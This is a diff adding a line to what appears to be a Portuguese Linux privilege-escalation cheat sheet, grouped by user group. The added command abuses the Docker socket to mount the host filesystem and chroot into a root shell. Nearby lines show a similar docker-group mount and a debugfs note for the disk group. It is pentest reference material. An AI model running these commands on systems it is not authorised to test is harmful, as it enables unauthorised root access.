@@ -186,6 +186,9 @@ uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)
 # Grupo DOCKER
 docker run -v /root:/mnt -it ubuntu  (Este comando cria uma nova instância do Docker com o diretório /root no sistema de arquivos host montado como um volume. Uma vez que o contêiner é iniciado, podemos navegar no diretório root)
 
+# Usando o arquivo docker.sock para virar root (geralmente em /var/run)
+docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
+
 # Grupo DISK
  Um invasor com esses privilégios pode usar debugfspara acessar todo o sistema de arquivos com privilégios de nível raiz.
 
